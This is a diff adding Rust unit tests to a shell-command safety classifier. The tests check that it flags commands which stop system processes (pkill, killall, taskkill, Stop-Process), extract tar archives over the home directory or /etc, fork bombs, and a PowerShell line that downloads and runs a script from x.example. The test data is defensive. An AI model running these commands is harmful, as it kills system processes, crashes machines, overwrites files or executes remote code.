@@ -660,3 +660,568 @@ fn a_downloaded_script_is_not_also_unknown() {
         vec![Rule::RunDownloaded]
     );
 }
+
+// ---- Review follow-up: more ways to stop, unpack and download ----
+
+#[test]
+fn pkill_and_killall_search_their_expression_in_each_name() {
+    check(
+        Shell::Posix,
+        &posix(),
+        &[
+            // A name is compared whole when it is a plain word to killall.
+            "killall login",
+            "killall Window",
+            "killall launch",
+            // `-x` wants the whole name, and `pkill -f server` is not in
+            // `WindowServer` (the case counts).
+            "pkill -x login",
+            "pkill -x '^login$'",
+            "pkill -f server",
+            "pkill server",
+            "pkill '^window'",
+            "pkill 'ogin$'",
+            "pkill 'login.x'",
+            "pkill -f 'node.*server'",
+            "pkill -f vite",
+            "pkill -f 'npm run dev'",
+            "killall -r server",
+            "killall -r Servers",
+        ],
+        &[
+            ("pkill login", Rule::StopSystem),
+            ("pkill ^login", Rule::StopSystem),
+            ("pkill '^login'", Rule::StopSystem),
+            ("pkill Window", Rule::StopSystem),
+            ("pkill launch", Rule::StopSystem),
+            ("pkill -f login", Rule::StopSystem),
+            ("pkill -9 launch", Rule::StopSystem),
+            ("pkill 'hd$'", Rule::StopSystem),
+            ("pkill 'kernel_'", Rule::StopSystem),
+            ("pkill '^kernel'", Rule::StopSystem),
+            ("pkill 'login.*'", Rule::StopSystem),
+            ("pkill '.*login.*'", Rule::StopSystem),
+            ("pkill '^login.*$'", Rule::StopSystem),
+            ("pkill -x 'login.*'", Rule::StopSystem),
+            ("pkill 'node|login'", Rule::StopSystem),
+            ("pkill '(login)'", Rule::StopSystem),
+            (
+                "pkill -f /System/Library/CoreServices/loginw",
+                Rule::StopSystem,
+            ),
+            ("pkill -i server", Rule::StopSystem),
+            ("pkill --ignore-case server", Rule::StopSystem),
+            ("pkill Server", Rule::StopSystem),
+            ("pkill -9 loginwin", Rule::StopSystem),
+            ("killall -r login", Rule::StopSystem),
+            ("killall -r '^launch'", Rule::StopSystem),
+            ("killall -m launch", Rule::StopSystem),
+            ("killall -r -I server", Rule::StopSystem),
+            ("killall --regexp --ignore-case server", Rule::StopSystem),
+        ],
+    );
+}
+
+#[test]
+fn svchost_is_a_process_the_system_needs() {
+    check(
+        Shell::PowerShell,
+        &windows(),
+        &["Stop-Process -Name svc", "taskkill /F /IM svchostx.exe"],
+        &[
+            ("Stop-Process -Name svchost -Force", Rule::StopSystem),
+            ("Stop-Process -Name SvcHost.exe", Rule::StopSystem),
+            ("Stop-Process -Name svc*", Rule::StopSystem),
+            ("taskkill /F /IM svchost.exe", Rule::StopSystem),
+            (
+                "taskkill /F /FI \"IMAGENAME eq svchost.exe\"",
+                Rule::StopSystem,
+            ),
+        ],
+    );
+    check(
+        Shell::Posix,
+        &posix(),
+        &[],
+        &[
+            ("killall svchost", Rule::StopSystem),
+            ("pkill -x svchost", Rule::StopSystem),
+        ],
+    );
+}
+
+#[test]
+fn stop_process_reads_its_own_parameters() {
+    check(
+        Shell::PowerShell,
+        &windows(),
+        &[
+            "Stop-Process -N node",
+            "Stop-Process -ProcessName node",
+            "Stop-Process -Proc node -Force",
+            "Stop-Process -Name:node",
+            "Stop-Process -Name node -ErrorAction SilentlyContinue",
+            "Stop-Process -ErrorAction SilentlyContinue -Name node",
+            "spps -ea 0 -Name node",
+            "kill -n node",
+            "Stop-Process -Name node -PassThru -WhatIf",
+            "Stop-Process -Id 12 -Confirm:$false",
+        ],
+        &[
+            ("Stop-Process -N explorer", Rule::StopSystem),
+            ("Stop-Process -Na explorer", Rule::StopSystem),
+            ("Stop-Process -ProcessName explorer", Rule::StopSystem),
+            ("Stop-Process -Proc explorer", Rule::StopSystem),
+            ("Stop-Process -Name:explorer", Rule::StopSystem),
+            (
+                "Stop-Process -ErrorAction SilentlyContinue -Name explorer",
+                Rule::StopSystem,
+            ),
+            ("Stop-Process -ea 0 -N explorer -Force", Rule::StopSystem),
+            ("kill -n *", Rule::StopSystem),
+            ("kill -ProcessName winlogon", Rule::StopSystem),
+            ("Stop-Process -N node,explorer", Rule::StopSystem),
+            ("Stop-Process -N $n", Rule::StopSystem),
+        ],
+    );
+}
+
+#[test]
+fn stop_process_given_a_listing_is_judged_like_the_pipeline() {
+    check(
+        Shell::PowerShell,
+        &windows(),
+        &[
+            "Stop-Process -InputObject (Get-Process node)",
+            "Stop-Process -Id (Get-Process -Name node).Id",
+            "Stop-Process -Id (Get-Process node | Select-Object -First 1).Id",
+            "Stop-Process (Get-Process node)",
+            "Stop-Process -Id (Get-Process -Id $pid).Id",
+            "Stop-Process -Id (Get-NetTCPConnection -LocalPort 3000).OwningProcess",
+            "Stop-Process -InputObject $p",
+            "Get-Process node | % { Stop-Process -Id $_.Id }",
+            "Get-Process node | ForEach-Object { Stop-Process -InputObject $_ -Force }",
+            "$procs | % { Stop-Process -Id $_.Id }",
+            "Get-NetTCPConnection -LocalPort 3000 | % { Stop-Process -Id $_.OwningProcess }",
+            "Get-Process | % { $_.Name }",
+        ],
+        &[
+            (
+                "Stop-Process -InputObject (Get-Process) -Force",
+                Rule::StopSystem,
+            ),
+            (
+                "Stop-Process -InputObject (Get-Process explorer)",
+                Rule::StopSystem,
+            ),
+            ("Stop-Process -Id (Get-Process).Id", Rule::StopSystem),
+            ("Stop-Process -Id $(Get-Process)", Rule::StopSystem),
+            ("Stop-Process (Get-Process)", Rule::StopSystem),
+            (
+                "Stop-Process -Id (Get-Process | Where-Object CPU -gt 1).Id",
+                Rule::StopSystem,
+            ),
+            (
+                "Stop-Process -Id (Get-Process).Where({ $_.CPU -gt 1 }).Id",
+                Rule::StopSystem,
+            ),
+            (
+                "Get-Process | % { Stop-Process -InputObject $_ }",
+                Rule::StopSystem,
+            ),
+            (
+                "Get-Process | % { Stop-Process -Id $_.Id }",
+                Rule::StopSystem,
+            ),
+            (
+                "Get-Process | ForEach-Object { Stop-Process -Id $PSItem.Id -Force }",
+                Rule::StopSystem,
+            ),
+            (
+                "Get-Process -Name explorer | % { Stop-Process -Id $_.Id }",
+                Rule::StopSystem,
+            ),
+            (
+                "Get-Process | Where-Object CPU -gt 1 | % { Stop-Process -Id $_.Id }",
+                Rule::StopSystem,
+            ),
+            (
+                "Get-Process | % { if ($_.CPU -gt 1) { Stop-Process -Id $_.Id } }",
+                Rule::StopSystem,
+            ),
+        ],
+    );
+    let windows = windows();
+    for (line, reason_text) in [
+        (
+            "Stop-Process -InputObject (Get-Process)",
+            "stops every process",
+        ),
+        (
+            "Get-Process | % { Stop-Process -Id $_.Id }",
+            "stops every process",
+        ),
+        (
+            "Stop-Process -Id (Get-Process | Where-Object CPU -gt 1).Id",
+            "stops processes picked by a filter only known when it runs",
+        ),
+    ] {
+        assert_eq!(
+            reason(line, Shell::PowerShell, &windows, Rule::StopSystem).as_deref(),
+            Some(reason_text),
+            "{line}"
+        );
+    }
+}
+
+#[test]
+fn a_listing_picked_by_id_or_filtered_is_not_every_process() {
+    check(
+        Shell::PowerShell,
+        &windows(),
+        &[
+            "Get-Process -Id 123 | Stop-Process",
+            "Get-Process -Id $pid | Stop-Process",
+            "gps -Id 1,2 | kill",
+            "Get-Process -InputObject $x | Stop-Process",
+            "Get-Process | Where-Object { $_.ProcessName -eq 'node' } | Stop-Process",
+            "Get-Process | Where-Object { $_.Name -like 'node*' } | Stop-Process -Force",
+            "Get-Process | Where-Object { $PSItem.Name -eq 'node' } | Stop-Process -WhatIf",
+            "gps | ? Name -eq node | kill",
+            "Get-Process | Where-Object ProcessName -like 'node*' | Stop-Process",
+            "Get-Process | Where-Object -Property ProcessName -eq -Value node | Stop-Process",
+            "Get-Process | Where-Object -FilterScript { $_.Name -eq 'node' } | Stop-Process",
+            "Get-Process node | Where-Object { $_.CPU -gt 100 } | Stop-Process",
+            "Get-Process node | Sort-Object CPU | Select-Object -First 1 | Stop-Process",
+            "Get-Process | Where-Object { $_.ProcessName -ceq 'node' } | Stop-Process",
+        ],
+        &[
+            (
+                "Get-Process | Where-Object { $_.ProcessName -eq 'explorer' } | Stop-Process",
+                Rule::StopSystem,
+            ),
+            (
+                "Get-Process | Where-Object { $_.Name -like 'e*' } | Stop-Process",
+                Rule::StopSystem,
+            ),
+            ("gps | ? Name -eq svchost | kill", Rule::StopSystem),
+            (
+                "Get-Process | Where-Object { $_.CPU -gt 100 } | Stop-Process",
+                Rule::StopSystem,
+            ),
+            (
+                "Get-Process | Where-Object { $_.ProcessName -ne 'node' } | Stop-Process",
+                Rule::StopSystem,
+            ),
+            (
+                "Get-Process | Where-Object { $_.ProcessName -eq 'a' -or $_.CPU -gt 1 } | Stop-Process",
+                Rule::StopSystem,
+            ),
+            (
+                "Get-Process | Where-Object { $_.ProcessName -eq $n } | Stop-Process",
+                Rule::StopSystem,
+            ),
+            (
+                "Get-Process | Where-Object { $_.Id -eq 5 } | Stop-Process",
+                Rule::StopSystem,
+            ),
+            (
+                "Get-Process | Select-Object -First 1 | Stop-Process",
+                Rule::StopSystem,
+            ),
+            (
+                "Get-Process | ForEach-Object { $_ } | Stop-Process",
+                Rule::StopSystem,
+            ),
+            (
+                "Get-Process node | ForEach-Object { Get-Process } | Stop-Process",
+                Rule::StopSystem,
+            ),
+            (
+                "Get-Process | Where-Object { $_.ProcessName -eq 'node' } | Stop-Process; Get-Process | Stop-Process",
+                Rule::StopSystem,
+            ),
+        ],
+    );
+    let windows = windows();
+    for (line, reason_text) in [
+        (
+            "Get-Process | Where-Object { $_.CPU -gt 100 } | Stop-Process",
+            "stops processes picked by a filter only known when it runs",
+        ),
+        (
+            "Get-Process | Select-Object -First 1 | Stop-Process",
+            "stops processes picked by a filter only known when it runs",
+        ),
+        (
+            "Get-Process | ForEach-Object { $_ } | Stop-Process",
+            "stops processes only known when it runs",
+        ),
+        (
+            "Get-Process | Where-Object { $_.Name -eq 'explorer' } | Stop-Process",
+            "stops a process the system needs",
+        ),
+        ("Get-Process | Stop-Process", "stops every process"),
+    ] {
+        assert_eq!(
+            reason(line, Shell::PowerShell, &windows, Rule::StopSystem).as_deref(),
+            Some(reason_text),
+            "{line}"
+        );
+    }
+}
+
+#[test]
+fn taskkill_with_only_a_filter_stops_what_the_filter_picks() {
+    let risky = [
+        "taskkill /F /FI \"STATUS eq RUNNING\"",
+        "taskkill /F /FI \"MEMUSAGE gt 1\"",
+        "taskkill /F /FI \"PID gt 0\"",
+        "taskkill /F /FI \"SESSION eq 1\"",
+        "taskkill /F /FI \"WINDOWTITLE eq x*\"",
+        "taskkill /F /FI \"CPUTIME gt 00:00:01\"",
+        "taskkill /F /FI \"STATUS ne RUNNING\"",
+        "taskkill /F /FI \"STATUS eq UNKNOWN\"",
+        "taskkill /F /FI \"status eq running\" /T",
+        "taskkill /F /FI \"MEMUSAGE gt 1\" /FI \"STATUS eq NOT RESPONDING\"",
+        "taskkill /F /FI \"\"",
+    ];
+    check(
+        Shell::PowerShell,
+        &windows(),
+        &[
+            "taskkill /F /IM node.exe /FI \"MEMUSAGE gt 1\"",
+            "taskkill /PID 12 /FI \"STATUS eq RUNNING\"",
+            "taskkill /F /FI \"STATUS eq NOT RESPONDING\"",
+            "taskkill /F /FI \"status eq not responding\"",
+            "taskkill /F /FI \"IMAGENAME eq node.exe\" /FI \"MEMUSAGE gt 1\"",
+        ],
+        &risky.map(|line| (line, Rule::StopSystem)),
+    );
+    check(
+        Shell::Cmd,
+        &windows(),
+        &["taskkill /f /pid 4 /fi \"status eq running\""],
+        &[
+            ("taskkill /f /fi \"status eq running\"", Rule::StopSystem),
+            ("taskkill /f /fi \"memusage gt 1\"", Rule::StopSystem),
+        ],
+    );
+    assert_eq!(
+        reason(
+            "taskkill /F /FI \"PID gt 0\"",
+            Shell::PowerShell,
+            &windows(),
+            Rule::StopSystem
+        )
+        .as_deref(),
+        Some("stops every process a filter picks")
+    );
+}
+
+#[test]
+fn tar_takes_a_unique_prefix_of_a_long_option() {
+    check(
+        Shell::Posix,
+        &posix(),
+        &[
+            "tar --cre -f x.tar -C ~ .",
+            "tar --crea -f x.tar -C ~ .",
+            "tar --lis -f x.tar -C ~",
+            "tar --upd -f x.tar -C ~ .",
+            "tar --app -f x.tar -C ~ .",
+            "tar --dif -f x.tar -C ~",
+            "tar --com -f x.tar -C ~",
+            "tar --ext --to-stdout -f x.tar -C ~",
+            "tar --ext --to-s -f x.tar -C ~",
+            "tar --extr --to-std -f x.tar -C ~",
+            "tar --ex -f x.tar -C ~",
+            "tar --one-file-system -f x.tar -C ~",
+            "tar --ext -f x.tar -C build",
+            "tar --ext --dir build -f x.tar",
+            "tar --ext --one-top=build -f x.tar",
+        ],
+        &[
+            ("tar --ext -f x.tar -C ~", Rule::Overwrite),
+            ("tar --extr -f x.tar -C ~", Rule::Overwrite),
+            ("tar --extra -f x.tar -C ~", Rule::Overwrite),
+            ("tar --extrac -f x.tar -C ~", Rule::Overwrite),
+            ("tar --ext -C ~ -f x.tar", Rule::Overwrite),
+            ("tar --ext -f x.tar --dir ~", Rule::Overwrite),
+            ("tar --ext -f x.tar --one-top=~", Rule::Overwrite),
+            ("tar --ext -f x.tar --one-top-level=~", Rule::Overwrite),
+            ("bsdtar --ext -f x.tar -C ~", Rule::Overwrite),
+            ("gtar --extr -f x.tar -C /etc", Rule::Overwrite),
+            ("tar --ext -f x.tar -C \"$d\"", Rule::Overwrite),
+        ],
+    );
+}
+
+#[test]
+fn tar_with_a_mode_only_known_when_it_runs_may_unpack() {
+    check(
+        Shell::Posix,
+        &posix(),
+        &[
+            "tar -czf \"$out\" -C ~ .",
+            "tar -cf \"$out\" -C ~ \"$file\"",
+            "tar -tf \"$a\" -C ~",
+            "tar \"$mode\" -f x.tar -C build",
+            "tar $mode -f x.tar -C .",
+            "tar \"$mode\" -f x.tar -O -C ~",
+            "tar --create -f \"$out\" -C ~ .",
+            "tar -xf x.tar \"$file\"",
+        ],
+        &[
+            ("tar \"$mode\" -f x.tar -C ~", Rule::Overwrite),
+            ("tar $mode -C ~", Rule::Overwrite),
+            ("tar -f x.tar $mode -C ~", Rule::Overwrite),
+            ("tar -f x.tar -C ~ \"-$mode\"", Rule::Overwrite),
+            ("tar \"$mode\" -f x.tar -C /usr/local", Rule::Overwrite),
+            ("tar $(echo xf) x.tar -C ~", Rule::Overwrite),
+            ("cd ~ && tar $mode x.tar", Rule::Overwrite),
+        ],
+    );
+}
+
+#[test]
+fn decoding_bytes_is_not_downloading() {
+    let line = "iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)))";
+    assert_eq!(
+        rules(line, Shell::PowerShell, &windows()),
+        vec![Rule::Unknown]
+    );
+    check(
+        Shell::PowerShell,
+        &windows(),
+        &["Write-Output ([Text.Encoding]::UTF8.GetString($bytes))"],
+        &[
+            (
+                "iex ((New-Object Net.Http.HttpClient).GetStringAsync('https://x.example/a.ps1').Result)",
+                Rule::RunDownloaded,
+            ),
+            (
+                "iex ([Text.Encoding]::UTF8.GetString($b))",
+                Rule::Unknown,
+            ),
+        ],
+    );
+}
+
+#[test]
+fn a_fork_bomb_in_a_nested_function_is_judged_on_its_own() {
+    check(
+        Shell::Posix,
+        &posix(),
+        &[
+            "f() { echo hi; g() { echo hi; }; }; f",
+            "f() { g() { h & }; }; f",
+        ],
+        &[
+            ("f() { g() { g & }; }", Rule::StopSystem),
+            ("f() { echo x; f() { f | f; }; }", Rule::StopSystem),
+            ("f() { f & g() { echo hi; }; }", Rule::StopSystem),
+        ],
+    );
+}
+
+#[test]
+#[allow(
+    clippy::disallowed_methods,
+    reason = "the guard keeps no clock; only this test times it, to catch a super-linear read"
+)]
+fn the_process_rules_read_long_patterns_quickly() {
+    let windows = windows();
+    let linux = posix();
+    let slow = std::time::Duration::from_millis(500);
+    let lines = [
+        (
+            Shell::PowerShell,
+            format!("Stop-Process -Name '{}zz'", "*".repeat(26)),
+            &windows,
+        ),
+        (
+            Shell::PowerShell,
+            format!("Stop-Process -Name '{}zz'", "*".repeat(60_000)),
+            &windows,
+        ),
+        (
+            Shell::Cmd,
+            format!("taskkill /IM {}q", "*".repeat(30)),
+            &windows,
+        ),
+        (
+            Shell::Cmd,
+            format!("taskkill /IM {}q", "*?".repeat(30_000)),
+            &windows,
+        ),
+        (
+            Shell::PowerShell,
+            format!("Stop-Process -Name '{}'", "[".repeat(60_000)),
+            &windows,
+        ),
+        (
+            Shell::PowerShell,
+            format!("Stop-Process -Name '{}'", "[a]".repeat(20_000)),
+            &windows,
+        ),
+        (
+            Shell::Posix,
+            format!("pkill '{}}}'", "x{".repeat(31_000)),
+            &linux,
+        ),
+        (
+            Shell::Posix,
+            format!("pkill 'x{}'", "{1".repeat(31_000)),
+            &linux,
+        ),
+        (
+            Shell::Posix,
+            format!("pkill '{}'", "(".repeat(60_000)),
+            &linux,
+        ),
+        (
+            Shell::Posix,
+            format!("pkill '{}'", "a|".repeat(30_000)),
+            &linux,
+        ),
+        (
+            Shell::Posix,
+            format!("pkill '{}'", "^(.*".repeat(15_000)),
+            &linux,
+        ),
+    ];
+    for (shell, line, paths) in &lines {
+        assert!(line.len() <= 64 * 1024, "{}", line.len());
+        let started = std::time::Instant::now();
+        let _ = classify(line, *shell, paths);
+        let took = started.elapsed();
+        assert!(took < slow, "{shell:?} {} bytes took {took:?}", line.len());
+    }
+}
+
+#[test]
+#[allow(
+    clippy::disallowed_methods,
+    reason = "the guard keeps no clock; only this test times it, to catch a super-linear read"
+)]
+fn the_fork_bomb_scan_reads_nested_functions_quickly() {
+    let linux = posix();
+    let slow = std::time::Duration::from_millis(500);
+    for line in [
+        format!("{}f & {}", "f(){ ".repeat(390), "; }".repeat(390)),
+        format!("{}{}", "f(){ f & ".repeat(390), "}; ".repeat(390)),
+        format!("{}f; {}", "f(){ ".repeat(1_000), "; }".repeat(1_000)),
+        format!(
+            "f() {{ {}f & {}; }}",
+            "{ ".repeat(1_500),
+            "echo x; ".repeat(2_500)
+        ),
+        format!("f() {{ {}{}f & }}", "{ ".repeat(1_500), "f; ".repeat(5_000)),
+    ] {
+        let started = std::time::Instant::now();
+        let _ = classify(&line, Shell::Posix, &linux);
+        let took = started.elapsed();
+        assert!(took < slow, "{} bytes took {took:?}", line.len());
+    }
+}
